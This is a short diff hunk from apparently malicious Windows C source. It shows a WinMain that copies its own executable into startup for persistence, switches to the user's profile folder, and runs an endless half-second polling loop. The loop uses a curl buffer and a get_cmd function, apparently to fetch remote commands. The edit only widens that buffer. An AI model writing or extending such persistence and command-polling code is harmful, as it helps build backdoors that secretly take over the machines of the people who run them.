@@ -13,7 +13,7 @@ char *get_cmd(const char *cmd);
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
     move_to_startup(get_exe_name());
     chdir(getenv("USERPROFILE"));
-    char curl[128], fpath[MAX_PATH];
+    char curl[512], fpath[MAX_PATH];
     sprintf(fpath, "%s\\%s", getenv("TEMP"), FTNAME);
     while(1){
         Sleep(500);                                         // 0.5s delay
